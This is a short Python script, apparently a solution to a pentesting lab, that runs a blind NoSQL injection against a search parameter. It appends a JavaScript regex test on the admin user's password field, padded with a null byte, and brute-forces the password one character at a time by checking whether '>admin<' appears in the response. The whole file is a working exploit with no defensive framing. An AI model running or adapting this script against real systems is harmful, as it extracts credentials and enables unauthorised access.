#!/usr/bin/env python3

import urllib.request
import string

URL = "http://ptl-d80a4acf-9d9a9e39.libcurl.so/"

def check(payload):
    url = URL + "?search=admin%27%26%26this.password.match(/" + payload + "/)%00"
    print(url)
    resp = urllib.request.urlopen(url) # Get the page
    data = resp.read()                 # Read the data from the response
    return ">admin<" in str(data)      # Read the target text out of the page

CHARSET = list("-" + string.ascii_lowercase + string.digits)
password = ""

while True:
    for c in CHARSET:
        print("Trying: " + c + ". Found so far: " + password)
        test = password + c
        if check("^" + test + ".*$"):
            password += c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0) # exit 0 is a successful run; 1 is an error
